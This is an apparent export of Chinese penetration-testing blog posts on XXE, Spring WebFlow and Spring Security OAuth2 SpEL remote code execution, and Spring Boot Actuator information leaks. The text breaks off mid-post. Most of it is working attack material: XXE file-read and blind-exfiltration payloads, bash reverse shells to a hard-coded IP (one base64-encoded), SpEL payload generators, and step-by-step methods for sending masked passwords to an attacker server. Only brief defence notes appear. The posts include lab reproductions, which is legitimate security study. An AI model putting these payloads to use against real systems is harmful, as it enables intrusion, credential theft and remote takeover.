[{"id":"f73a8e23e6f6f669cf99c7dba8fa0722","title":"","content":"一、漏洞描述XML 外部实体注入（XML External Entity）简称 XXE 漏洞，XML 用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML 文档结构包括 XML 声明、DTD 文档类型定义（可选）、文档元素。 \n&lt;?xml version=\"1.0\"?>\n&lt;!--文档类型定义-->\n&lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档-->\n&lt;!ELEMENT note (to,from,heading,body)> &lt;!--定义 note 元素有四个元素-->\n&lt;!ELEMENT to (#PCDATA)> &lt;!--定义 to 元素为”#PCDATA”类型-->\n&lt;!ELEMENT from (#PCDATA)> &lt;!--定义 from 元素为”#PCDATA”类型-->\n&lt;!ELEMENT head (#PCDATA)> &lt;!--定义 head 元素为”#PCDATA”类型-->\n&lt;!ELEMENT body (#PCDATA)> &lt;!--定义 body 元素为”#PCDATA”类型-->\n]]]>\n&lt;!--文档元素-->\n&lt;note>\n&lt;to>Dave&lt;/to>\n&lt;from>Tom&lt;/from>\n&lt;head>Reminder&lt;/head>\n&lt;body>You are a good man&lt;/body>\n&lt;/note>\n\n常见的XML语法结构如下所示：\n\n\n其中，文档定义类型（DTD）可以是内部声明也可以引用外部 DTD。\n内部声明 DTD 格式：。\n引用外部 DTD 格式：。\n在 DTD 中进行实体说明时，将使用 ENTITY 关键字来声明。实体是用于定义引用普通文本或特殊字符的快捷方式的变量。实体可在内部或外部进行声明。\n内部声明实体格式：。\n引用外部实体格式：。\nSYSTEM、PUBLIC 对外部资源进行申请。\n由于 xxe 漏洞主要是利用了 DTD 引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。当libXML &lt;libxml2.9 才会造成外部注入漏洞。\n语法引用外部的实体，而非内部实体，那么 URI 中能写哪些类型的外部实体呢？\n主要的有 file、http、https、ftp 等等，当然不同的程序支持的不一样：\n\n二、白盒分析1 （moonsec靶机）&lt;?php\nif(isset($_POST['submit']) and $_POST['xml'] != null)&#123;\n\t$xml =$_POST['xml'];\n// $xml = $test;\n\t$data = @simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT);\n\tif($data)&#123;\n\t\t$html.=\"&lt;pre>&#123;$data&#125;&lt;/pre>\";\n\t&#125;else&#123;\n\t\t$html.=\"&lt;p>XML 声明、DTD 文档类型定义、文档元素这些都搞懂了吗?&lt;/p>\";\n\t&#125;\n&#125;\n?>\n\n获取 post 的 xml 文件 传递到 simplexml_load_string 再进行输出会遭成 xxe 注入测试的 payload\n&lt;?xml version = \"1.0\"?> &lt;!DOCTYPE ANY [ &lt;!ENTITY f SYSTEM \"file:///etc/passwd\"> ]> &lt;x>&amp;f;&lt;/x>\n\n2&lt;?php\n$string_xml = '&lt;?xml version=\"1.0\"\nencoding=\"utf-8\"?>&lt;note>&lt;to>George&lt;/to>&lt;from>John&lt;/from>&lt;heading>Reminder&lt;/heading>&lt;body>xml\n实体注入&lt;/body>&lt;/note>';\n$xml = isset($_GET['xml'])?$_GET['xml']:$string_xml;\n$data = simplexml_load_string($xml);\necho '&lt;meta charset=\"UTF-8\">';\nprint_r($data);\n?>\n\n\n\n获取 xml 变量 创建 dom 对象 转入 xml 进行处理输出。\nsimplexml_load_string() 函数把 XML 字符串载入对象中\n三、攻击1、有回显&lt;?xml version=\"1.0\"?>&lt;!DOCTYPE a [&lt;!ENTITY b \"xxe\">]>&lt;c>&amp;b;&lt;/c>\n\nxxe 漏洞常用利用如下\n1.读取敏感文件\n&lt;?xml version=\"1.0\"?>&lt;!DOCTYPE a [&lt;!ENTITY b SYSTEM \"file:///etc/passwd\">]>&lt;c>&amp;b;&lt;/c>\n&lt;?xml version=\"1.0\"?>&lt;!DOCTYPE a [&lt;!ENTITY b SYSTEM \"file:///C:/Windows/win.ini\">]>&lt;c>&amp;b;&lt;/c>\n\nurl 编码\n读取 windows 文件\nhttp://127.0.0.1/xxe.php?xml=&lt;%3fxml version%3d\"1.0\"%3f>&lt;!DOCTYPE%20 a%20 [&lt;!ENTITY b SYSTEM \"file%3a%2f%2f%2fC%3a%2fWindows%2fwin.ini\">]>&lt;c>%26b%3b&lt;%2fc>\n\nlinux 就读取/etc/passwd 文件进行测试\n2.使用 php 伪协议 php://filter 读取文件\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?>\n&lt;!DOCTYPE xdsec [\n&lt;!ELEMENT methodname ANY >\n&lt;!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=phpinfo.php\" >]>\n&lt;methodcall>\n&lt;methodname>&amp;xxe;&lt;/methodname>\n&lt;/methodcall>\n\n\n\nhttp://127.0.0.1/xxe.php?xml=%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%65%6e%63%6f%64%69%6e%67%3d%22%75%74%66%2d%38%22%3f%3e%20%0a%3c%21%44%4f%43%54%59%50%45%20%78%64%73%65%63%20%5b%0a%3c%21%45%4c%45%4d%45%4e%54%20%6d%65%74%68%6f%64%6e%61%6d%65%20%41%4e%59%20%3e%0a%3c%21%45%4e%54%49%54%59%20%78%78%65%20%53%59%53%54%45%4d%20%22%70%68%70%3a%2f%2f%66%69%6c%74%65%72%2f%72%65%61%64%3d%63%6f%6e%76%65%72%74%2e%62%61%73%65%36%34%2d%65%6e%63%6f%64%65%2f%72%65%73%6f%75%72%63%65%3d%70%68%70%69%6e%66%6f%2e%70%68%70%22%20%3e%5d%3e%0a%3c%6d%65%74%68%6f%64%63%61%6c%6c%3e%0a%3c%6d%65%74%68%6f%64%6e%61%6d%65%3e%26%78%78%65%3b%3c%2f%6d%65%74%68%6f%64%6e%61%6d%65%3e%0a%3c%2f%6d%65%74%68%6f%64%63%61%6c%6c%3e\n\n\n\n3.扫描内网和端口\n通过扫描 ip 和端口确定内网机器的 ip 和端口开发情况，访问端口会获取 baner 信息\n&lt;?xml version=\"1.0\"?>\n&lt;!DOCTYPE ANY [\n&lt;!ENTITY test SYSTEM \"http://127.0.0.1:80\">\n]>\n&lt;abc>&amp;test;&lt;/abc>\nhttp://127.0.0.1/xxe.php?xml=%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%3f%3e%0a%3c%21%44%4f%43%54%59%50%45%20%41%4e%59%20%5b%0a%3c%21%45%4e%54%49%54%59%20%74%65%73%74%20%53%59%53%54%45%4d%20%22%68%74%74%70%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%38%30%22%3e%0a%5d%3e%0a%3c%61%62%63%3e%26%74%65%73%74%3b%3c%2f%61%62%63%3e\n\n\n\n4.执行命令\n若开启 expect 扩展\nhttp://webpenter.com/xxe.php?xml=&lt;?xml version=\"1.0\"?>\n&lt;!DOCTYPE ANY [\n&lt;!ENTITY test SYSTEM \"expect://whoami\">\n]>\n&lt;abc>&amp;test;&lt;/abc>\n\n\n\n2、没回显称为 blind xxe 可以使用外带数据通道 提取数据\n&lt;?xml version=\"1.0\"?>\n&lt;!DOCTYPE ANY[\n&lt;!ENTITY % file SYSTEM \"file:///C:/1.txt\">\n&lt;!ENTITY % remote SYSTEM \"http://192.168.0.107/evil.xml\">\n%remote;\n%all;\n]>\n&lt;root>&amp;send;&lt;/root>\n\n远程服务器上的\nevil.xml 文件内容\n&lt;!ENTITY % all \"&lt;!ENTITY send SYSTEM 'http://192.168.0.107/1.php?file=%file;'>\">\n\n\n\n&lt;?php file_put_contents(\"1.txt\", $_GET['file']); ?>\n\n\n\nhttp://127.0.0.1/xxe.php?xml=%3C%3fxml%20version%3d%221.0%22%3f%3E%0A%3C!DOCTYPE%20ANY[%0A%3C!ENTITY%20%25%20file%20SYSTEM%20%22file%3a%2f%2f%2fC%3a%2f1.txt%22%3E%0A%3C!ENTITY%20%25%20remote%20SYSTEM%20%22http%3a%2f%2f192.168.0.146%2fevil.xml%22%3E%0A%25remote%3b%0A%25all%3b%0A]%3E%0A%3Croot%3E%26send%3b%3C%2froot%3E\n\n文件写入成功。获取 1.txt 内容。\n&lt;!DOCTYPE root [\n&lt;!ENTITY % remote SYSTEM \"http://n22tow.dnslog.cn\">\n%remote;]>\n&lt;root/>\n\n\n\n三、防御1.使用开发语言提供的禁用外部实体的方法\nPHP：\nlibxml_disable_entity_loader(true);\nJAVA:\nDocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();\ndbf.setExpandEntityReferences(false);\nPython：\nfrom lxml import etree\nxmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))\n2.过滤用户提交的 XML 数据\n关键词：&lt;!DOCTYPE 和&lt;!ENTITY，或者，SYSTEM 和 PUBLIC\n3.升级 libxml 组件\n","slug":"XXE漏洞","date":"2021-11-05T09:41:17.005Z","categories_index":"","tags_index":"","author_index":"街溜子小王"},{"id":"8177e6fe27c9facc727b78285c09ddd1","title":"Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）","content":"一、漏洞介绍Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。\n参考链接：\n\nhttps://threathunter.org/topic/593d562353ab369c55425a90\n\nhttps://pivotal.io/security/cve-2017-4971\n\n\n二、漏洞复现使用vulhub环境\ncd /vulhub/spring/CVE-2017-4971 docker-compose up -d\n\n首先访问http://your-ip:8080/login，用页面左边给出的任意一个账号/密码登录系统：\n\n然后访问id为1的酒店http://your-ip:8080/hotels/1，点击预订按钮“Book Hotel”，填写相关信息后点击“Process”\n\n\n点击confirm的同时抓包\n抓到一个POST数据包，我们向其中添加一个字段（也就是反弹shell的POC）：\n&amp;_(new+java.lang.ProcessBuilder(\"bash\",\"-c\",\"bash+-i+>%26+/dev/tcp/204.44.95.237/8888+0>%261\")).start()=vulhub\n\n点击forward放包\n\nVPS收到shell\n\n","slug":"Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）","date":"2021-10-13T12:56:13.935Z","categories_index":"渗透测试","tags_index":"渗透测试","author_index":"街溜子小王"},{"id":"6567db906d267d45710c8c967afd05c5","title":"Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977） SpEL表达式 RCE","content":"一、漏洞原理\nspring boot 处理参数值出错，流程进入 org.springframework.util.PropertyPlaceholderHelper 类中\n\n此时 URL 中的参数值会用 parseStringValue 方法进行递归解析\n\n其中  $&#123;&#125;  包围的内容都会被 org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration 类的 resolvePlaceholder 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞\n\n\n二、利用条件\nspring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0\n\n至少知道一个触发 springboot 默认错误页面的接口及参数名\n\n\n三、利用方法步骤一：找到一个正常传参处比如发现访问  /article?id=xxx ，页面会报状态码为 500 的错误： Whitelabel Error Page，则后续 payload 都将会在参数 id 处尝试。\n步骤二：执行 SpEL 表达式输入 /article?id=$&#123;7*7&#125; ，如果发现报错页面将 7*7 的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。由字符串格式转换成 0x** java 字节形式，方便执行任意代码：\n# coding: utf-8\n\nresult = \"\"\ntarget = 'open -a Calculator'\nfor x in target:\n    result += hex(ord(x)) + \",\"\nprint(result.rstrip(','))\n\n执行 open -a Calculator 命令\n$&#123;T(java.lang.Runtime).getRuntime().exec(new String(new byte[]&#123;0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72&#125;))&#125;\n\n漏洞分析：​    SpringBoot SpEL表达式注入漏洞-分析与复现\n四、漏洞复现这里是用的vulhub，图个方便\ncd vulhub/spring/CVE-2016-4977/ docker-compose up -d\n\n启动完成后，访问http://your-ip:8080/即可看到web页面\n访问http://your-ip:8080/oauth/authorize?response_type=$&#123;233*233&#125;&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test。首先需要填写用户名和密码，我们这里填入admin:admin即可。\n可见，我们输入是SpEL表达式$&#123;233*233&#125;已经成功执行并返回结果：\n\n然后，我们使用poc.py来生成反弹shell的POC\n#!/usr/bin/env python\n\nmessage = input('Enter message to encode:')\n\npoc = '$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])\n\nfor ch in message[1:]:\n   poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch) \n\npoc += ')&#125;'\n\nprint(poc)\n\n\nVPS打开监听\nnc -lnvp 8888\n\n\n使用反弹shell命令\nbash -i >&amp; /dev/tcp/204.44.95.237/8888 0>&amp;1\n\n将命令编码得到\nbash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8yMDQuNDQuOTUuMjM3Lzg4ODggMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\n\n\n执行python脚本\npython poc.py\n\n将命令添加进去，得到payload\n\n将得到的payload替换到URL的**${233*233}**位置\n访问该链接，可以看到命令被执行\n\n同时VPS也收到了反弹的shell\n\n五、参考文章https://blog.knownsec.com/2016/10/spring-security-oauth-rce/\n","slug":"Spring Security OAuth2 远程命令执行漏洞（CVE-2016-4977） SpEL表达式 RCE","date":"2021-10-13T12:56:13.931Z","categories_index":"渗透测试","tags_index":"渗透测试","author_index":"街溜子小王"},{"id":"fe6d0336657ab32bcff127817b4afc45","title":"spring boot信息泄露漏洞","content":"一、路由地址及接口调用详情泄露    开发人员没有意识到地址泄漏会导致安全隐患或者开发环境切换为线上生产环境时，相关人员没有更改配置文件，忘记切换环境配置等\n\n直接访问以下两个 swagger 相关路由，验证漏洞是否存在：\n/v2/api-docs\n/swagger-ui.html\n\n其他一些可能会遇到的 swagger、swagger codegen、swagger-dubbo 等相关接口路由：\n/swagger\n/api-docs\n/api.html\n/swagger-ui\n/swagger/codes\n/api/index.html\n/api/v2/api-docs\n/v2/swagger.json\n/swagger-ui/html\n/distv2/index.html\n/swagger/index.html\n/sw/swagger-ui.html\n/api/swagger-ui.html\n/static/swagger.json\n/user/swagger-ui.html\n/swagger-ui/index.html\n/swagger-dubbo/api-docs\n/template/swagger-ui.html\n/swagger/static/index.html\n/dubbo-provider/distv2/index.html\n/spring-security-rest/api/swagger-ui.html\n/spring-security-oauth-resource/swagger-ui.html\n\n    除此之外，下面的 spring boot actuator 相关路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息：\n\n/mappings\n/metrics\n/beans\n/configprops\n/actuator/metrics\n/actuator/mappings\n/actuator/beans\n/actuator/configprops\n\n一般来讲，暴露出 spring boot 应用的相关接口和传参信息并不能算是漏洞，但是以 “默认安全“ 来讲，不暴露出这些信息更加安全。\n对于攻击者来讲，一般会仔细审计暴露出的接口以增加对业务系统的了解，并会同时检查应用系统是否存在未授权访问、越权等其他业务类型漏洞。\n二、配置不当而暴露的路由   程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置\n\n参考 production-ready-endpoints 和 spring-boot.txt，可能因为配置不当而暴露的默认内置路由可能会有：\n/actuator\n/auditevents\n/autoconfig\n/beans\n/caches\n/conditions\n/configprops\n/docs\n/dump\n/env\n/flyway\n/health\n/heapdump\n/httptrace\n/info\n/intergrationgraph\n/jolokia\n/logfile\n/loggers\n/liquibase\n/metrics\n/mappings\n/prometheus\n/refresh\n/scheduledtasks\n/sessions\n/shutdown\n/trace\n/threaddump\n/actuator/auditevents\n/actuator/beans\n/actuator/health\n/actuator/conditions\n/actuator/configprops\n/actuator/env\n/actuator/info\n/actuator/loggers\n/actuator/heapdump\n/actuator/threaddump\n/actuator/metrics\n/actuator/scheduledtasks\n/actuator/httptrace\n/actuator/mappings\n/actuator/jolokia\n/actuator/hystrix.stream\n\n其中对寻找漏洞比较重要接口的有：\n\n/env、/actuator/envGET 请求 /env 会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；同时有一定概率可以通过 POST 请求 /env 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。\n\n/refresh、/actuator/refreshPOST 请求 /env 接口设置属性后，可同时配合 POST 请求 /refresh 接口刷新属性变量来触发相关 RCE 漏洞。\n\n/restart、/actuator/restart暴露出此接口的情况较少；可以配合 POST请求 /env 接口设置属性后，再 POST 请求 /restart 接口重启应用来触发相关 RCE 漏洞。\n\n/jolokia、/actuator/jolokia可以通过 /jolokia/list 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。\n\n/trace、/actuator/httptrace一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。\n\n\n三、获取被星号脱敏的密码的明文（方法一）    访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果\n\n利用条件：\n\n目标网站存在 /jolokia 或 /actuator/jolokia 接口\n\n目标使用了 jolokia-core 依赖（版本要求暂未知）\n\n\n步骤一： 找到想要获取的属性名GET 请求目标网站的 /env 或 /actuator/env 接口，搜索 ****** 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。\n步骤二： jolokia 调用相关 Mbean 获取明文将下面示例中的 security.user.password 替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 value 键中。\n\n调用 org.springframework.boot Mbean\n\n\n\n\n\n\n\n\n\n\n实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法\nspring 1.x\nPOST /jolokia\nContent-Type: application/json\n\n&#123;\"mbean\": \"org.springframework.boot:name=SpringApplication,type=Admin\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"security.user.password\"]&#125;\n\nspring 2.x\nPOST /actuator/jolokia\nContent-Type: application/json\n\n&#123;\"mbean\": \"org.springframework.boot:name=SpringApplication,type=Admin\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"security.user.password\"]&#125;\n\n\n调用 org.springframework.cloud.context.environment Mbean\n\n\n\n\n\n\n\n\n\n\n实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法\nspring 1.x\nPOST /jolokia\nContent-Type: application/json\n\n&#123;\"mbean\": \"org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"security.user.password\"]&#125;\n\nspring 2.x\nPOST /actuator/jolokia\nContent-Type: application/json\n\n&#123;\"mbean\": \"org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"security.user.password\"]&#125;\n\n\n调用其他 Mbean\n\n\n\n\n\n\n\n\n\n\n目标具体情况和存在的 Mbean 可能不一样，可以搜索 getProperty 等关键词，寻找可以调用的方法。\n四、获取被星号脱敏的密码的明文（方法二）利用条件：\n\n可以 GET 请求目标网站的 /env\n\n可以 POST 请求目标网站的 /env\n\n可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖）\n\n目标使用了 spring-cloud-starter-netflix-eureka-client 依赖\n\n目标可以请求攻击者的服务器（请求可出外网）\n\n\n利用方法：\n步骤一： 找到想要获取的属性名    GET 请求目标网站的 `/env` 或 `/actuator/env` 接口，搜索 `******` 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。\n\n步骤二： 使用 nc 监听 HTTP 请求在自己控制的外网服务器上监听 80 端口：\nnc -lvk 80\n\n步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性将下面 http://value:$&#123;security.user.password&#125;@your-vps-ip  中的  security.user.password 换成自己想要获取的对应的星号 * 遮掩的属性名；your-vps-ip 换成自己外网服务器的真实 ip 地址。\nspring 1.x\nPOST /env\nContent-Type: application/x-www-form-urlencoded\n\neureka.client.serviceUrl.defaultZone=http://value:$&#123;security.user.password&#125;@your-vps-ip\n\nspring 2.x\nPOST /actuator/env\nContent-Type: application/json\n\n&#123;\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://value:$&#123;security.user.password&#125;@your-vps-ip\"&#125;\n\n步骤四： 刷新配置spring 1.x\nPOST /refresh\nContent-Type: application/x-www-form-urlencoded\n\nspring 2.x\nPOST /actuator/refresh\nContent-Type: application/json\n\n步骤五： 解码属性值正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 Authorization 头内容：\nAuthorization: Basic dmFsdWU6MTIzNDU2\n\n将其中的 dmFsdWU6MTIzNDU2部分使用 base64 解码，即可获得类似明文值 value:123456，其中的 123456 即是目标星号 * 脱敏前的属性值明文。\n五、获取被星号脱敏的密码的明文（方法三）利用条件：\n\n通过 POST /env 设置属性触发目标对外网指定地址发起任意 http 请求\n\n目标可以请求攻击者的服务器（请求可出外网）\n\n\n利用方法：\n\n\n\n\n\n\n\n\n\n参考 UUUUnotfound 提出的 ，可以在目标发外部 http 请求的过程中，在 url path 中利用占位符带出数据\n步骤一： 找到想要获取的属性名GET 请求目标网站的 /env 或 /actuator/env 接口，搜索 ****** 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。\n步骤二： 使用 nc 监听 HTTP 请求在自己控制的外网服务器上监听 80 端口：\nnc -lvk 80\n\n步骤三： 触发对外 http 请求\nspring.cloud.bootstrap.location 方法（同时适用于明文数据中有特殊 url 字符的情况）\n\nspring 1.x\nPOST /env\nContent-Type: application/x-www-form-urlencoded\n\nspring.cloud.bootstrap.location=http://your-vps-ip/?=$&#123;security.user.password&#125;\n\nspring 2.x\nPOST /actuator/env\nContent-Type: application/json\n\n&#123;\"name\":\"spring.cloud.bootstrap.location\",\"value\":\"http://your-vps-ip/?=$&#123;security.user.password&#125;\"&#125;\n\n\neureka.client.serviceUrl.defaultZone 方法（不适用于明文数据中有特殊 url 字符的情况）\n\nspring 1.x\nPOST /env\nContent-Type: application/x-www-form-urlencoded\n\neureka.client.serviceUrl.defaultZone=http://your-vps-ip/$&#123;security.user.password&#125;\n\nspring 2.x\nPOST /actuator/env\nContent-Type: application/json\n\n&#123;\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://your-vps-ip/$&#123;security.user.password&#125;\"&#125;\n\n步骤四： 刷新配置spring 1.x\nPOST /refresh\nContent-Type: application/x-www-form-urlencoded\n\nspring 2.x\nPOST /actuator/refresh\nContent-Type: application/json\n\n\n\n六、获取被星号脱敏的密码的明文（方法四）访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果\n利用条件：\n\n可正常 GET 请求目标 /heapdump 或 /actuator/heapdump 接口\n\n利用方法：\n步骤一： 找到想要获取的属性名GET 请求目标网站的 /env 或 /actuator/env 接口，搜索 ****** 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。\n步骤二： 下载 jvm heap 信息\n\n\n\n\n\n\n\n\n下载的 heapdump 文件大小通常在 50M—500M 之间，有时候也可能会大于 2G\nGET 请求目标的 /heapdump 或 /actuator/heapdump 接口，下载应用实时的 JVM 堆信息\n步骤三： 使用 MAT 获得 jvm heap 中的密码明文参考 文章 方法，使用 Eclipse Memory Analyzer 工具的 OQL 语句\nselect * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(\"password\"))\n\n或\n\nselect * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(\"password\"))\n\n辅助用 “password“ 等关键词快速过滤分析，获得密码等相关敏感信息的明文。\n","slug":"spring boot信息泄露漏洞","date":"2021-10-13T12:56:13.929Z","categories_index":"渗透测试","tags_index":"渗透测试","author_index":"街溜子小王"},{"id":"3126e077d4a90cee169e013b88d8de20","title":"Springboot之actuator配置不当引发漏洞","content":"一、actuator介绍Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息。\n其提供的执行器端点分为两类：原生端点和用户自定义扩展端点，原生端点主要有：\n\n\n\nHttp 方法\n路径\n描述\n\n\n\nget\n/autoconfig\n提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过\n\n\nget\n/configprops\n描述配置属性（包含默认值）如何注入 Bean\n\n\nget\n/beans\n描述应用程序上下文里全部的 Bean，以及它们的关系\n\n\nget\n/dump\n获取线程活动的快照\n\n\nget\n/env\n获取全部环境属性\n\n\nget\n/env/{name}\n根据名称获取特定的环境属性值\n\n\nget\n/health\n报告应用程序的健康指标，这些值由 HealthIndicator 的实现类提供\n\n\nget\n/info\n获取应用程序的定制信息，这些信息由 info 打头的属性提供\n\n\nget\n/mappings\n描述全部的 URI 路径，以及它们和控制器（包含 Actuator 端点）的映射关系\n\n\nget\n/metrics\n报告各种应用程序度量信息，比如内存用量和 HTTP 请求计数\n\n\nget\n/metrics/{name}\n报告指定名称的应用程序度量值\n\n\npost\n/shutdown\n关闭应用程序，要求 endpoints.shutdown.enabled 设置为 true（默认为 false）\n\n\nget\n/trace\n提供基本的 HTTP 请求跟踪信息（时间戳、HTTP 头等）\n\n\n二、漏洞发现一般来说，挖掘 actuator 配置不当的漏洞分如下两步：\n\n\n\n\n\n\n\n\n\n\n识别当前 web 应用使用的框架为 springboot 框架；2. 枚举执行器端点路径；下面针对这两步结合笔者漏洞挖掘中遇到的实例具体来说说。\n\n\n识别当前 web 应用使用的框架为 springboot 框架。主要有两个方法判断：\n\n\n\n\n\n\n\n\n\n\n①通过 web 应用程序网页标签的图标（favicon.ico）；如果 web 应用开发者没有修改 springboot web 应用的默认图标，那么进入应用首页后可以看到如下默认的绿色小图标：\n\n该绿色小图标是 spring 框架下的一个默认图标，尽管不能百分百就此图标确认当前 web 应用使用的是 springboot 框架，但是基本上也能百分之八十确认该 web 应用是使用 springboot 框架开发的了（毕竟 springboot 框架确实是太流行了）。\n\n\n\n\n\n\n\n\n\n②通过 springboot 框架默认报错页面；如果 web 应用开发者没有修改 springboot web 应用的默认 4xx、5xx 报错页面，那么当 web 应用程序出现 4xx、5xx 错误时，会报错如下（此处仅以 404 报错页面为例）：\n\n当出现如上报错页面，就能确定当前 web 应用是使用了 springboot 框架的。\n\n\n\n\n\n\n\n\n\n那么综合以上两个途径来判断当前 web 应用是否是 springboot 框架，就是通过访问不同的目录，看是否有小绿叶图标，然后就是想办法在不同目录下触发应用程序的 4xx 或 5xx 错误，看是否有 Whitelabel Error Page 报错。   \n\n枚举执行器端点路径。这个其实很简单，在确认当前 web 站点是 springboot 框架后，枚举当前站点的所有一级、二级甚至三级目录，然后写脚本对每个目录进行探测，查看目录下是否存在 actuator 执行端点路径即可。\n\n三、漏洞利用通过如上步骤，如果你发现了 actuator 的配置不当漏洞，那就要恭喜你啦。不过，尽管这些监控信息的泄露已经足够高危了，有时候碰到一些比较严格的厂商，需要你证明一下这些监控信息的具体危害，或者你想要将危害等级提升到严重，或者想要通过这些监控信息进一步挖掘其他漏洞，该怎么利用呢？笔者通过自身的踩坑经历，总结了如下几个点来尽可能最大化的利用该漏洞：        \n\n\n\n\n\n\n\n\n\n①认证字段的获取以证明可影响其他用户；这个主要通过访问/trace 路径获取用户认证字段信息，比如如下站点存在 actuator 配置不当漏洞，在其 trace 路径下，除了记录有基本的 HTTP 请求信息（时间戳、HTTP 头等），还有用户 token、cookie 字段：\ntrace 路径：\n\n用户认证字段泄露：\n\n通过替换 token 字段可获取其他用户的信息：\n\n②数据库账户密码泄露；由于 actuator 会监控站点 mysql、mangodb 之类的数据库服务，所以通过监控信息有时可以拿下 mysql、mangodb 数据库；这个主要通过/env 路径获取这些服务的配置信息，比如如下站点存在 actuator 配置不当漏洞，通过其/env 路径，可获得 mysql、mangodb 的用户名及密码：\n\nmangodb 及 mysql 都可直连，此处以 mysql 为例：\n\n该漏洞详情请见https://dvpnet.io/info/detail/id/814，是笔者去年在 dvp 平台提交的一个漏洞。一旦数据库外连成功，漏洞分分钟高危变严重啊。\n③git 项目地址泄露；这个一般是在/health 路径，比如如下站点，访问其 health 路径可探测到站点 git 项目地址：\n\n直接访问 git 项目地址，可拿下源码：\n\n④后台用户账号密码泄露；这个一般是在/heapdump 路径下，访问/heapdump 路径，返回 GZip 压缩 hprof 堆转储文件。在 Android studio 打开，会泄露站点内存信息，很多时候会包含后台用户的账号密码（包含漏洞的图片暂时没得，大家记住思路就好了..），通过泄露的账号密码，然后进入后台一番轰炸也不错的。\n四、安全措施引入 security 依赖，打开安全限制并进行身份验证；同时设置单独的 Actuator 管理端口并配置不对外网开放。详情请见先知社区https://xz.aliyun.com/t/2233\n","slug":"Springboot之actuator配置不当引发漏洞","date":"2021-10-13T12:56:13.927Z","categories_index":"渗透测试","tags_index":"渗透测试","author_index":"街溜子小王"},{"id":"4df23ce2d032e16090d56b72df860ee6","title":"spring boot介绍","content":"一、路由知识\n有些程序员会自定义 /manage、/management 、项目 App 相关名称为 spring 根路径\n\nSpring Boot Actuator 1.x 版本默认内置路由的起始路径为  / ，2.x 版本则统一以 /actuator 为起始路径\n\nSpring Boot Actuator 默认的内置路由名字，如 /env 有时候也会被程序员修改，比如修改成 /appenv\n\n\n二、版本知识Spring Cloud 是基于 Spring Boot 